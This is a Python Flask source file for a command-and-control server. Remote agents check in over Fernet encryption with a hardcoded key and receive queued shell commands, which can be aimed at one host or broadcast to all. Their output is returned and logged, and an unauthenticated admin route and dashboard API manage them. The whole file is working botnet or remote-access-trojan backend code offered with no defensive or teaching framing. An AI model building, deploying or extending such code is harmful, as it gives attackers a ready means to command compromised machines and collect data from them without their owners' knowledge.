from flask import Flask, request, render_template, jsonify, redirect, url_for
from cryptography.fernet import Fernet
import sqlite3
import time
import json
import uuid

app = Flask(__name__)

SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k=' 
cipher = Fernet(SECRET_KEY)

# --- DATABASE LOGIC ---
DB_FILE = 'c2.db'

def query_db(query, args=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute(query, args)
    rv = cur.fetchall()
    conn.commit()
    conn.close()
    return (rv[0] if rv else None) if one else rv

def init_db():
    query_db('''CREATE TABLE IF NOT EXISTS agents 
                (hostname TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT, relay TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS results 
                (id TEXT PRIMARY KEY, hostname TEXT, timestamp TEXT, output TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS queue 
                (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, command TEXT)''')

init_db()

@app.route('/')
def dashboard():
    return render_template('index.html')

@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        decrypted_raw = cipher.decrypt(request.data).decode()
        data = json.loads(decrypted_raw)
        host = data.get('hostname', 'unknown')
        relay = request.headers.get('Host', 'Direct IP')

        # Update Agent Table
        query_db("INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?)",
                 (host, request.remote_addr, data.get('os'), time.strftime('%H:%M:%S'), relay))

        # Check Queue
        cmd_row = query_db("SELECT * FROM queue WHERE hostname = ? OR hostname = 'ALL' LIMIT 1", (host,), one=True)
        
        cmd = "none"
        if cmd_row:
            cmd = cmd_row['command']
            query_db("DELETE FROM queue WHERE id = ?", (cmd_row['id'],))

        return cipher.encrypt(cmd.encode())
    except Exception as e:
        print(f"[!] Checkin Error: {e}")
        return "Error", 400

@app.route('/api/stats')
def api_stats():
    agents_rows = query_db("SELECT * FROM agents")
    results_rows = query_db("SELECT * FROM results ORDER BY timestamp DESC LIMIT 50")
    queue_rows = query_db("SELECT * FROM queue")
    
    agents_dict = {row['hostname']: dict(row) for row in agents_rows}
    # Append relevant history to each agent for the JS to process
    for host in agents_dict:
        agents_dict[host]['history'] = [dict(r) for r in results_rows if r['hostname'] == host]

    return jsonify({
        "agents": agents_dict,
        "queue": [dict(r) for r in queue_rows],
        "total_count": len(agents_dict)
    })

@app.route('/result', methods=['POST'])
def get_result():
    try:
        decrypted_output = cipher.decrypt(request.data).decode()
        parts = decrypted_output.split('|', 1)
        if len(parts) == 2:
            host, output = parts
            query_db("INSERT INTO results VALUES (?, ?, ?, ?)",
                     (str(uuid.uuid4())[:8], host, time.strftime('%H:%M:%S'), output))
        return "OK", 200
    except Exception as e:
        return "Error", 400

@app.route('/admin/send_cmd', methods=['POST'])
def send_command():
    target = request.form.get('target')
    cmd = request.form.get('command')
    query_db("INSERT INTO queue (hostname, command) VALUES (?, ?)", (target, cmd))
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)